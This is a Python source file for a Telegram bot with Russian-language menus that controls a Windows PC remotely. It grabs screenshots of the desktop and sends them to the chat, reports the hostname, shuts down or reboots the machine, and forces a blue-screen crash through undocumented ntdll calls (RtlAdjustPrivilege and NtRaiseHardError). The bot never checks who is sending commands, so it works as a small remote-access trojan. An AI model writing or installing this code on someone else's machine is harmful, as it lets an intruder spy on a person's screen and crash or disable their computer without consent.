import telebot
import getpass
import os
from PIL import Image, ImageGrab
import socket
from sys import platform
from ctypes import *
from ctypes.wintypes import *
from settings.config import TOKEN, LANGUAGE


USER_NAME = getpass.getuser()


HELP_MESSAGE_RU = """
/off (выкл PC)
/screen (сделать скриншот экрана)
/reboot (перезагрузить PC)
/who (узнать операционную систему и имя системы)
/bluescreen (включить синий экран)
/help (выводит это сообщение)
"""


bot = telebot.TeleBot(TOKEN)


mainkeyboard = telebot.types.ReplyKeyboardMarkup()


if LANGUAGE == 'RU':
    mainkeyboard.add('Питание⚡', 'Скриншот📷', 'Помощь🆘', 'Твой экран синий😈', 'Кто ты?🫵')
    powerkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    powerkeyboard.add('Назад🔙', 'Выключить PC☢️', 'Перезагрузить PC🔃')
    appkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    appkeyboard.add('Назад🔙')


@bot.message_handler(content_types=['text'])
def commands(message):
    if message.text == '/start':
        bot.send_message(message.chat.id, 'Выбери действие', reply_markup=mainkeyboard)
    

    elif message.text == 'Питание⚡':
        bot.send_message(message.chat.id, 'Выбери действие', reply_markup=powerkeyboard)
    

    elif message.text == 'Назад🔙':
        bot.send_message(message.chat.id, 'Вернул вас назад', reply_markup=mainkeyboard)


    elif message.text == '/off' or message.text == 'Выключить PC☢️':
        bot.send_message(message.chat.id, 'Компьютер будет выключен!', reply_markup=powerkeyboard)
        os.system('shutdown -s')


    elif message.text == '/help' or message.text == 'Помощь🆘':
        if LANGUAGE == 'RU':
            bot.send_message(message.chat.id, HELP_MESSAGE_RU, reply_markup=mainkeyboard)


    elif message.text == '/screen' or message.text == 'Скриншот📷':
        try:
            bot.send_message(message.chat.id, 'Делаю скриншот')
            screen = ImageGrab.grab()
            screen.save('screenshot.png')
            screen = open('screenshot.png', 'rb')
            bot.send_photo(message.chat.id, screen, reply_markup=mainkeyboard)
            os.remove('screenshot.png')
        except Exception as e:
            print(e)


    elif message.text == '/reboot' or message.text == 'Перезагрузить PC🔃':
        bot.send_message(message.chat.id, 'Перезагрузил!')
        os.system('shutdown -r -t 0')


    elif message.text == '/who' or  message.text == 'Кто ты?🫵':
        if platform == "win32":
            bot.send_message(message.chat.id,'oc: Windows\nИмя ПК: ' + socket.gethostname())


    elif message.text == '/bluescreen' or message.text == 'Твой экран синий😈':
        try:
            tmp1 = c_bool()
            tmp2 = DWORD()
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
            bot.send_message(message.chat.id, 'Синий экран вкл')
        except Exception as e:
            print(e)


bot.polling(none_stop=True)


